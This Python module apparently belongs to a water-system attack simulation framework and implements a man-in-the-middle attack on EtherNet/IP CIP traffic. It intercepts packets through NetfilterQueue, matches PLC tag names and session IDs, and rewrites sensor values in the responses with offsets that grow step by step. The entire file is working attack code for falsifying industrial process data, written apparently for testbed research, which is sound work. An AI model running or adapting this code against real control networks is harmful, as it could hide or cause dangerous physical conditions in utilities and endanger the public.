from wacsim.network_attacks.mitm_netfilter_queue_subprocess import PacketQueue
import argparse
from pathlib import Path
import os
import sys

from scapy.layers.inet import IP, TCP
from scapy.packet import Raw

from wacsim.network_attacks.utilities import translate_payload_to_float, translate_float_to_payload

def extract_tag_name(payload):
    """
    Extract tag name from a CIP Read/Write packet based on CIP path structure.

    CIP path starts after the service code and class/instance/attribute segments.
    Logical segment format:
    - Byte 0: segment type (usually 0x91 for symbolic segment)
    - Byte 1: number of 16-bit words (N)
    - Next N*2 bytes: ASCII tag name, padded if odd-length
    """
    try:
        for i in range(40, 80):  # scan likely region
            if payload[i] == 0x91:  # 0x91 = symbolic logical segment
                tag_len_words = payload[i + 1]
                tag_bytes = payload[i + 2 : i + 2 + tag_len_words * 2]
                tag = tag_bytes.decode("ascii", errors="ignore").rstrip("\x00").strip()
                tag = tag.split(":")[0]  # Drop CIP instance number

                return tag
        return ""
    except Exception as e:
        return ""



class SeqMiTMNetfilterQueue(PacketQueue):

    def __init__(self, intermediate_yaml_path: Path, yaml_index: int, queue_number: int):
        super().__init__(intermediate_yaml_path, yaml_index, queue_number)
        self.attacked_tags = self.intermediate_attack['tags']
        self.session_ids = []

        # Track iterations per tag
        self.tag_iterations = {tag['tag']: 0 for tag in self.attacked_tags} #
        self.tag_real_last_values = {tag['tag']: 8888 for tag in self.attacked_tags} #
        self.tag_Modified_last_values = {tag['tag']: 8888 for tag in self.attacked_tags} #

    def capture(self, packet):
        """
        Capture and modify packets based on SeqMiTM attack.
        - Checks CIP packets
        - Applies `scaleParam` every `scaleTime` iterations
        """
        try:
            p = IP(packet.get_payload())

            if 'TCP' in p and Raw in p:
                payload = p[Raw].load

                # 🔹 Log raw payload for debugging
                #self.logger.debug(f"Captured packet raw payload: {payload.hex()}")

                this_session = int.from_bytes(payload[4:8], sys.byteorder)

                # 🔹 Dynamically extract tag name

                tag_name = extract_tag_name(payload)

                self.logger.debug(f" Extracted tag name: '{tag_name} ' | Length: {len(tag_name)} | Session ID: {this_session}, p len: {len(p)}")

                # 🔹 CIP request: Track session ID
                if len(p) >105 and tag_name:
                    for tag in self.attacked_tags:
                        if tag_name == tag['tag']:
                            self.session_ids.append(this_session)
                            self.current_attacked_tag = tag
                            self.logger.debug(f"Session {this_session} mapped to tag {tag_name}")

                # 🔹 CIP response: Modify the value
                elif len(p) == 102:
                    if this_session in self.session_ids: # it works @ 19.2 1:28
                        value = translate_payload_to_float(payload)

                        tag_name = self.current_attacked_tag['tag']

                        #add the value to the dictionary if it is different from the last one
                        self.logger.debug(f"Tag name: {tag_name} | Value: {value} | Last value: {self.tag_real_last_values[tag_name]}, | Last modified value: {self.tag_Modified_last_values[tag_name]}, | Target IP: {p[IP].dst}")
                        if value and value != self.tag_real_last_values[tag_name]  : # only modify the value with the scale param if it is different from the last one and for packets that goes to the target, charactherized by the dest ip with 192.168
                        #if value and value != self.tag_real_last_values[tag_name] and '192.168' in p[IP].dst : # only modify the value with the scale param if it is different from the last one and for packets that goes to the target, charactherized by the dest ip with 192.168
                            self.tag_real_last_values[tag_name] = value
                            self.tag_iterations[tag_name] += 1
                            self.logger.debug(f"Iteration count for {tag_name}: {self.tag_iterations[tag_name]}")

                            # 🔹 Apply scaling only every `scaleTime` iterations
                            if self.tag_iterations[tag_name] % self.current_attacked_tag['scaleTime'] == 0:
                                if 'value' in self.current_attacked_tag:
                                    self.current_attacked_tag['value'] += self.current_attacked_tag['scaleParam']
                                    modified_value_total= self.current_attacked_tag['value']
                                elif 'offset' in self.current_attacked_tag:
                                    self.current_attacked_tag['offset'] += self.current_attacked_tag['scaleParam']
                                    modified_value_total= value + self.current_attacked_tag['offset']
                                self.logger.debug(f"@@@@@@@@@@@@@Updated@@@@@@@@@@@ {tag_name} | Iteration: {self.tag_iterations[tag_name]} | "
                                                  f"New value: {self.current_attacked_tag.get('value', 'N/A')} | "
                                                  f"New offset: {self.current_attacked_tag.get('offset', 'N/A')}")
                                self.tag_Modified_last_values[tag_name] = modified_value_total

                        # 🔹 Modify the packet payload
                        if 'value' in self.current_attacked_tag:
                            modified_value = self.current_attacked_tag['value']
                            p[Raw].load = translate_float_to_payload(modified_value, payload)
                        elif 'offset' in self.current_attacked_tag:
                            modified_value = value + self.current_attacked_tag['offset']
                            p[Raw].load = translate_float_to_payload(modified_value, payload)
                        else:
                            modified_value = value  # No change

                        self.logger.debug(f"Modified {tag_name} | Offset {self.current_attacked_tag['offset']} | New Value: {modified_value} | Target IP: {p[IP].dst}")

                        # 🔹 Recalculate checksums
                        del p[IP].chksum
                        del p[TCP].chksum

                        # 🔹 Set modified packet payload
                        packet.set_payload(bytes(p))

            packet.accept()

        except Exception as exc:
            self.logger.error(f"Error processing packet: {exc}")
            if self.nfqueue:
                self.nfqueue.unbind()
            sys.exit(0)


def is_valid_file(parser_instance, arg):
    """Verifies whether the intermediate YAML path is valid."""
    if not os.path.exists(arg):
        parser_instance.error(arg + " does not exist")
    else:
        return arg


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Start SeqMiTM attack NetfilterQueue')
    parser.add_argument(dest="intermediate_yaml",
                        help="Intermediate YAML file", metavar="FILE",
                        type=lambda x: is_valid_file(parser, x))
    parser.add_argument(dest="index", help="Index of the network attack in intermediate YAML",
                        type=int, metavar="N")
    parser.add_argument(dest="number", help="Number of the queue configured in IP Tables",
                        type=int, metavar="N")

    args = parser.parse_args()

    attack = SeqMiTMNetfilterQueue(
        intermediate_yaml_path=Path(args.intermediate_yaml),
        yaml_index=args.index,
        queue_number=args.number
    )
    attack.main_loop()
